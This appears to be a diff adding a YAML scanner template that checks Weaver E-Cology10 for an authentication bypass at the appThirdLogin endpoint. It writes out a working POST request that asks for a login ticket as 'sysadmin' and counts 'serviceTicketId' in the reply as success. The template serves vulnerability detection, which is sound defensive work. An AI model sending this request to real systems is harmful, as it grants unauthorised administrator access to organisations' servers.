@@ -1,0 +1,22 @@
+id:
+
+info:
+  name: 泛微E-Cology10 appThirdLogin 身份认证绕过漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /papi/passport/rest/appThirdLogin
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+  data: |
+    username=sysadmin&service=1&ip=1&loginType=third
+response1:
+  headers:
+  body: serviceTicketId
+  code: 200
+requests2:
+response2:
